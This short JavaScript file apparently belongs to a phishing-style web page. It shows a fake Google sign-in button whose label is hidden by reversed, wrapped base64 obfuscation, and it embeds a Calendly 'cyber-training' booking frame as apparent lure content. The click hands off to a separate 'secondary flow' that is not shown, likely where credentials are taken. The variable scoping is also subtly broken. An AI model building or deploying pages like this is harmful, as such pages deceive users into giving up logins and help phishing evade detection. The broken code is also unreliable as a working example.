if (typeof PREFIX === 'undefined' || typeof SUFFIX === 'undefined'){
    const PREFIX = "OBFS";
    const SUFFIX = "END";
}


const CALENDLY_PAGE_NAME = "etech-it";
const CALENDLY_EVENT_TYPE = "cyber-training"


const INVITEE_NAME = "";
const INVITEE_EMAIL = "";

const shadowhost = document.getElementById('primary');
const shadowroot = shadowhost.shadowRoot;



function deobfString(str) {
    let withoutPrefixSuffix = str.slice(PREFIX.length, -SUFFIX.length);
    let reversed = withoutPrefixSuffix.split('').reverse().join('');
    return atob(reversed);
}



function initializePage() {

    console.log("Primary Received: PrimaryContentLoaded")

    const loginBtn = shadowroot.getElementById("login-btn");

    loginBtn.innerHTML = `<img id="lgImg" src="/primary/images/google-logo.svg"></img>${deobfString(loginBtn.innerText)}`

    loginBtn.addEventListener("click", triggerSecondaryFlowStart);

    const buildURL = () => {
        return calendlyURL = 'https://calendly.com/'+CALENDLY_PAGE_NAME+'/'+CALENDLY_EVENT_TYPE+'?embed_type=Inline&name='+INVITEE_NAME+'&email='+INVITEE_EMAIL;
    };
    
    const showCalendly = () => {
        const calendlyURL = buildURL();
        const calendlyFrame = shadowroot.getElementById('calendly-frame');
        calendlyFrame.src = calendlyURL;  
    };
    showCalendly();

    document.addEventListener("secondaryFlowCompleted", handleSecondaryFlowComplete);

}


function triggerSecondaryFlowStart(){
    document.dispatchEvent(new CustomEvent('secondaryFlowStart', {bubbles: true, composed: true}));
}


function handleSecondaryFlowComplete(){
    console.log("Primary Received: secondaryFlowCompleted")
    const primaryOverlay = shadowroot.getElementById('primary-overlay-container');
    primaryOverlay.style.display = 'none';
    primaryOverlay.style.pointerEvents = 'auto';
}


document.addEventListener("PrimaryContentLoaded", initializePage);

document.addEventListener("secondaryFlowCompleted", handleSecondaryFlowComplete);